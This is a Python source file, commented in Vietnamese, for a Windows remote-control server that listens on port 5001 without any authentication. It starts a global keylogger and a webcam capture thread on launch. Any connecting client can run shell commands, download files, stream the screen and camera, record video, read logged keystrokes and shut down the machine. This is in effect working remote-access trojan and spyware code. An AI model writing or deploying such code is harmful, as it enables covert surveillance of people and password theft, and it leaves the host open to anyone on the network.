import socket
import subprocess
import threading
import time
import os
from datetime import datetime
import cv2
import json
import struct 
from PIL import ImageGrab
import io
import numpy as np
from pynput import keyboard
import psutil # Đảm bảo đã pip install psutil
import ctypes # Dùng để tắt màn hình console (nếu muốn)

HOST = "0.0.0.0"
PORT = 5001

# --- BIẾN TOÀN CỤC ---
global_cap = None
global_frame = None
camera_lock = threading.Lock()
is_camera_running = True
is_keylogging = False 

# ==========================================
# KEYLOGGER
# ==========================================
def on_press(key):
    global is_keylogging
    if not is_keylogging: return
    try:
        k = key.char
    except AttributeError:
        if key == keyboard.Key.space: k = " [SPACE] "
        elif key == keyboard.Key.enter: k = " [ENTER]"
        elif key == keyboard.Key.backspace: k = " [BS] "
        else: k = f" [{str(key).replace('Key.', '')}] "
    try:
        with open("web_keylog.txt", "a", encoding="utf-8") as f: 
            f.write(str(k) + " ")
    except: pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    print("[INFO] System Keylogger listener ready.")

start_keylogger()

# ==========================================
# HÀM HỆ THỐNG & FILE (WINDOWS)
# ==========================================
def get_file_bytes(path):
    if os.path.exists(path) and os.path.isfile(path):
        return os.path.getsize(path), open(path, 'rb')
    return 0, None

def list_directory(path):
    try:
        # Xử lý đường dẫn Windows
        if not path or path == ".": path = os.getcwd()
        
        # Nếu path là root (ví dụ chỉ gửi list_dir), có thể trả về danh sách ổ đĩa
        if path == "/": 
            drives = [f"{d}:\\" for d in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ' if os.path.exists(f"{d}:")]
            items = [{"name": d, "type": "folder", "size": 0, "path": d} for d in drives]
            return {"current_path": "My Computer", "items": items}

        if not os.path.exists(path): return {"error": "Path not found"}
        
        items = []
        for name in os.listdir(path):
            try:
                full_path = os.path.join(path, name)
                is_dir = os.path.isdir(full_path)
                size = os.path.getsize(full_path) if not is_dir else 0
                items.append({
                    "name": name,
                    "type": "folder" if is_dir else "file",
                    "size": size,
                    "path": full_path
                })
            except: pass
            
        items.sort(key=lambda x: (x["type"] == "file", x["name"].lower()))
        return {"current_path": path, "items": items}
    except Exception as e: return {"error": str(e)}

def run_shell(cmd):
    try:
        # Windows dùng encoding 'cp1252' hoặc 'utf-8' tuỳ máy, set shell=True
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        try:
            return output.decode('utf-8')
        except:
            return output.decode('cp1252', errors='ignore')
    except subprocess.CalledProcessError as e: 
        try: return e.output.decode('utf-8')
        except: return str(e)
    except Exception as e: return str(e)

# ==========================================
# QUẢN LÝ APP (WINDOWS)
# ==========================================
def scan_installed_apps():
    # Windows không có thư mục App chung như Mac. 
    # Scan Start Menu để lấy shortcut
    found_apps = {}
    paths = [
        os.path.join(os.environ["ProgramData"], r"Microsoft\Windows\Start Menu\Programs"),
        os.path.join(os.environ["APPDATA"], r"Microsoft\Windows\Start Menu\Programs")
    ]
    
    for p in paths:
        if not os.path.exists(p): continue
        for root, dirs, files in os.walk(p):
            for file in files:
                if file.endswith(".lnk"):
                    name = os.path.splitext(file)[0]
                    full_path = os.path.join(root, file)
                    found_apps[name.lower()] = full_path
    
    # Thêm một số app cơ bản mặc định
    found_apps["notepad"] = "notepad.exe"
    found_apps["calculator"] = "calc.exe"
    found_apps["chrome"] = "chrome.exe"
    
    return dict(sorted(found_apps.items(), key=lambda item: item[1]))

APPS = scan_installed_apps()

def is_app_running(name):
    # Tìm trong danh sách process
    name = name.lower()
    if name.endswith(".lnk"): name = name[:-4]
    if not name.endswith(".exe"): name += ".exe"
    
    return name in (p.name().lower() for p in psutil.process_iter())

def start_app(path_or_name):
    try:
        os.startfile(path_or_name) # Lệnh mở file/app chuẩn trên Windows
        return f"[OK] Started {path_or_name}"
    except Exception as e:
        return f"[ERROR] {e}"

def stop_app(name):
    # Cần tên file exe (ví dụ: notepad.exe)
    # Nếu đầu vào là tên shortcut, cố gắng đoán tên exe
    proc_name = os.path.basename(name)
    if proc_name.endswith(".lnk"): proc_name = proc_name[:-4]
    if not proc_name.endswith(".exe"): proc_name += ".exe"

    try:
        # Dùng taskkill mạnh mẽ trên Windows
        subprocess.run(["taskkill", "/F", "/IM", proc_name], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return f"[OK] Killed {proc_name}"
    except:
        return f"[ERROR] Could not kill {proc_name} (Not running?)"

# ==========================================
# SYSTEM CONTROL (WINDOWS)
# ==========================================
def shutdown_machine(): 
    subprocess.run(["shutdown", "/s", "/t", "0"])
    return "[OK] Shutdown sent"

def restart_machine(): 
    subprocess.run(["shutdown", "/r", "/t", "0"])
    return "[OK] Restart sent"

def get_process_json():
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                p.info['cpu_percent'] = p.cpu_percent() 
                if p.info['cpu_percent'] > 0.0 or p.info['memory_percent'] > 0.1:
                    procs.append(p.info)
            except: pass
        procs.sort(key=lambda x: x['cpu_percent'], reverse=True)
        return json.dumps(procs[:50])
    except: return "[]"

def get_sys_stats():
    return json.dumps({
        "cpu": psutil.cpu_percent(interval=None),
        "ram": psutil.virtual_memory().percent,
        "disk": psutil.disk_usage('C:\\').percent # Mặc định lấy ổ C
    })

def kill_process_id(pid):
    try:
        p = psutil.Process(pid)
        p.terminate()
        return "OK"
    except Exception as e: return f"Error: {e}"

# ==========================================
# MEDIA
# ==========================================
def camera_loop():
    global global_cap, global_frame
    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW) # CAP_DSHOW giúp mở cam nhanh hơn trên Windows
    cap.set(3, 640); cap.set(4, 480)
    if not cap.isOpened(): return
    global_cap = cap
    while is_camera_running:
        ret, frame = cap.read()
        if ret:
            with camera_lock: global_frame = frame
        else: time.sleep(0.1)
    cap.release()

threading.Thread(target=camera_loop, daemon=True).start()

def capture_screen_bytes():
    try:
        img = ImageGrab.grab()
        b = io.BytesIO()
        img.save(b, format='JPEG', quality=60) # Giảm chất lượng chút cho mượt
        return b.getvalue()
    except: return None

def capture_webcam_bytes():
    with camera_lock:
        if global_frame is None: return None
        fc = global_frame.copy()
    try: _, b = cv2.imencode('.jpg', fc, [int(cv2.IMWRITE_JPEG_QUALITY), 80]); return b.tobytes()
    except: return None

def capture_full_quality_bytes():
    try:
        img = ImageGrab.grab()
        b = io.BytesIO()
        img.save(b, format='JPEG', quality=100)
        return b.getvalue()
    except: return None

def take_screenshot():
    try:
        os.makedirs("screenshots", exist_ok=True)
        filename = f"screenshots/shot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        ImageGrab.grab().save(filename)
        return f"[OK] Saved: {filename}"
    except Exception as e: return f"[ERROR] {e}"

def record_webcam(seconds):
    out = None
    try:
        os.makedirs("recordings", exist_ok=True)
        filename = f"recordings/webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        with camera_lock:
            if global_frame is None: return None
            h, w, _ = global_frame.shape
        # Windows dùng 'mp4v' thường ổn hơn 'avc1' nếu chưa cài codec
        out = cv2.VideoWriter(filename, cv2.VideoWriter_fourcc(*'mp4v'), 20.0, (w, h))
        start = time.time()
        while (time.time() - start) < seconds:
            with camera_lock:
                if global_frame is not None: out.write(global_frame)
            time.sleep(0.05)
        return filename
    except: return None
    finally:
        if out: out.release()

def send_data(conn, data):
    if data is None: conn.sendall(struct.pack(">L", 0)); return
    conn.sendall(struct.pack(">L", len(data))); conn.sendall(data)

def handle_client(conn, addr):
    global is_keylogging
    try:
        data = conn.recv(4096).decode().strip()
        if not data: return
        parts = data.split()
        command = parts[0].lower()

        if command == "disconnect": return
        
        # --- APP ---
        elif command in ("start", "stop"):
             if len(parts) >= 2:
                 key = " ".join(parts[1:]).lower()
                 name = APPS.get(key, " ".join(parts[1:]))
                 res = start_app(name) if command == "start" else stop_app(name)
                 conn.sendall(res.encode())
             return
        elif command == "list_apps":
            # Trên Windows, is_app_running hơi khó chính xác với shortcut, tạm trả về list tĩnh
            conn.sendall(json.dumps({k: {"name": k, "running": False} for k in APPS.keys()}).encode()); return

        # --- SYSTEM ---
        elif command == "sys_stats": conn.sendall(get_sys_stats().encode()); return
        elif command == "list_processes_json": conn.sendall(get_process_json().encode()); return
        elif command == "list_processes": 
            # Giả lập output dạng text cho client cũ
            try:
                out = subprocess.check_output("tasklist", shell=True).decode('cp1252', errors='ignore')
                conn.sendall(out.encode('utf-8'))
            except: conn.sendall(b"Error getting tasklist")
            return
        elif command == "kill_process":
            res = kill_process_id(int(parts[1])) if len(parts)>1 and parts[1].isdigit() else "Error"
            conn.sendall(res.encode()); return
        elif command == "shutdown": conn.sendall(shutdown_machine().encode())
        elif command == "restart": conn.sendall(restart_machine().encode())
        elif command == "shell":
            res = run_shell(" ".join(parts[1:]))
            conn.sendall(res.encode('utf-8', errors='replace')); return

        # --- FILES ---
        elif command == "list_dir":
            path = " ".join(parts[1:]) if len(parts) > 1 else "."
            conn.sendall(json.dumps(list_directory(path)).encode()); return
        elif command == "get_file":
            path = " ".join(parts[1:])
            size, f = get_file_bytes(path)
            conn.sendall(struct.pack(">L", size))
            if f:
                while True:
                    chunk = f.read(4096)
                    if not chunk: break
                    conn.sendall(chunk)
                f.close()
            return

        # --- MEDIA & KEYLOG ---
        elif command == "screen_stream": send_data(conn, capture_screen_bytes()); return
        elif command == "download_screenshot": send_data(conn, capture_full_quality_bytes()); return
        elif command == "webcam_stream": send_data(conn, capture_webcam_bytes()); return
        elif command == "screenshot": conn.sendall(take_screenshot().encode())
        elif command == "webcam_record":
             vp = record_webcam(int(parts[1]))
             if vp and os.path.exists(vp):
                 with open(vp, "rb") as f: send_data(conn, f.read())
                 try: os.remove(vp) 
                 except: pass
             else: send_data(conn, None)
             return
        elif command == "keylog_start": is_keylogging=True; conn.sendall(b"OK"); return
        elif command == "keylog_stop": is_keylogging=False; conn.sendall(b"OK"); return
        elif command == "keylog_clear": 
            with open("web_keylog.txt","w") as f: f.write("")
            conn.sendall(b"OK"); return
        elif command == "keylog_data":
             try:
                with open("web_keylog.txt", "r", encoding="utf-8") as f: r=f.read()
             except: r=""
             conn.sendall(r.encode()); return
        elif command == "keylog_web":
             # Ghi phím từ web gửi về
             if is_keylogging:
                 key_char = parts[1] if len(parts)>1 else ""
                 if key_char == "[SPACE]": key_char = " "
                 with open("web_keylog.txt", "a", encoding="utf-8") as f: f.write(key_char + " ") 
             conn.sendall(b"OK"); return
        
        else: conn.sendall(b"Unknown")
    except Exception as e: print(e)
    finally: conn.close()

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    print(f"Windows Server listening on {HOST}:{PORT}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()

if __name__ == "__main__": start_server()